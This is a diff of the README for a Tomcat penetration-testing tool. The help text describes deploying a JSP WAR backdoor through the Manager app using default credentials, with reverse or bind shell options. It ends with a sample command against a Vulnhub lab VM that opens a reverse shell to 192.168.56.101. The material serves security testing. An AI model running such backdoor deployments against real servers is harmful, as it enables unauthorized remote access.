@@ -13,7 +13,7 @@ Here goes the help:
 ```
 user$ python tomcatWarDeployer.py --help
 
-    Apache Tomcat auto WAR deployment & launching tool
+Apache Tomcat auto WAR deployment & launching tool
     Mariusz B. / MGeeky '16
 
 Penetration Testing utility aiming at presenting danger of leaving Tomcat misconfigured.
@@ -24,40 +24,60 @@ Usage: tomcatWarDeployer.py [options] server
 
 Options:
   -h, --help            show this help message and exit
-  -R APPNAME, --remove=APPNAME
-                        Remove deployed app with specified name. Can be used
-                        for post-assessment cleaning
-  -X PASSWORD, --shellpass=PASSWORD
-                        Specifies authentication password for uploaded shell,
-                        to prevent unauthenticated usage. Default: randomly
-                        generated. Specify "None" to leave the shell
-                        unauthenticated.
-  -t TITLE, --title=TITLE
-                        Specifies head>title for uploaded JSP WAR payload.
-                        Default: "JSP Application"
-  -n APPNAME, --name=APPNAME
-                        Specifies JSP application name. Default: "jsp_app"
-  -x, --unload          Unload existing JSP Application with the same name.
-                        Default: no.
-  -C, --noconnect       Do not connect to the spawned shell immediately. By
-                        default this program will connect to the spawned
-                        shell, specifying this option let's you use other
-                        handlers like Metasploit, NetCat and so on.
-  -f WARFILE, --file=WARFILE
-                        Custom WAR file to deploy. By default the script will
-                        generate own WAR file on-the-fly.
 
   General options:
     -v, --verbose       Verbose mode.
+    -G OUTFILE, --generate=OUTFILE
+                        Generate JSP backdoor only and put it into specified
+                        outfile path then exit. Do not perform any
+                        connections, scannings, deployment and so on.
     -U USER, --user=USER
                         Tomcat Manager Web Application HTTP Auth username.
                         Default="tomcat"
     -P PASS, --pass=PASS
                         Tomcat Manager Web Application HTTP Auth password.
                         Default="tomcat"
+
+  Connection options:
+    -H RHOST, --host=RHOST
+                        Remote host for reverse tcp payload connection. When
+                        specified, RPORT must be specified too. Otherwise,
+                        bind tcp payload will be deployed listening on 0.0.0.0
+    -p PORT, --port=PORT
+                        Remote port for the reverse tcp payload when used with
+                        RHOST or Local port if no RHOST specified thus acting
+                        as a Bind shell endpoint.
+    -u URL, --url=URL   Apache Tomcat management console URL. Default:
+                        /manager/
+
+  Payload options:
+    -R APPNAME, --remove=APPNAME
+                        Remove deployed app with specified name. Can be used
+                        for post-assessment cleaning
+    -X PASSWORD, --shellpass=PASSWORD
+                        Specifies authentication password for uploaded shell,
+                        to prevent unauthenticated usage. Default: randomly
+                        generated. Specify "None" to leave the shell
+                        unauthenticated.
+    -t TITLE, --title=TITLE
+                        Specifies head>title for uploaded JSP WAR payload.
+                        Default: "JSP Application"
+    -n APPNAME, --name=APPNAME
+                        Specifies JSP application name. Default: "jsp_app"
+    -x, --unload        Unload existing JSP Application with the same name.
+                        Default: no.
+    -C, --noconnect     Do not connect to the spawned shell immediately. By
+                        default this program will connect to the spawned
+                        shell, specifying this option let's you use other
+                        handlers like Metasploit, NetCat and so on.
+    -f WARFILE, --file=WARFILE
+                        Custom WAR file to deploy. By default the script will
+                        generate own WAR file on-the-fly.
 ```
 
+
 And sample usage on [Kevgir 1 VM by canyoupwn.me](https://www.vulnhub.com/entry/kevgir-1,137/) running at 192.168.56.100:8080 :
+
 
 ```
 user$ python tomcatWarDeployer.py -C -x -v -H 192.168.56.101 -p 4545 -n shell 192.168.56.100:8080
